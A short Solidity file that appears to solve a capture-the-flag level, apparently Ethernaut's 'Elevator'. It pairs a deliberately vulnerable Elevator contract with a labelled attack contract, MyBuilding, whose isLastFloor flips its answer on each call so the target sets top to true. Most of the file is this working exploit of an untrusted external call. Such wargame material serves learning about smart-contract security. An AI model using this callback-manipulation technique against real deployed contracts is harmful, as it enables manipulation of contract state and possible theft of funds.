// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

//Challenge :- To define the bool top true;

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}


//////////////////////////////////////////////////////////
//////////////////ATTCK///////////////////////////////////
//////////////////////////////////////////////////////////



contract MyBuilding {
    Elevator elevator;
    bool change = true;

    constructor(Elevator _elevator) {
        elevator = _elevator;
    }

    function isLastFloor(uint256 _floor) external returns (bool) {
        change = !change;
        return change;
    }

    function attack() external {
        elevator.goTo(10);
    }
}
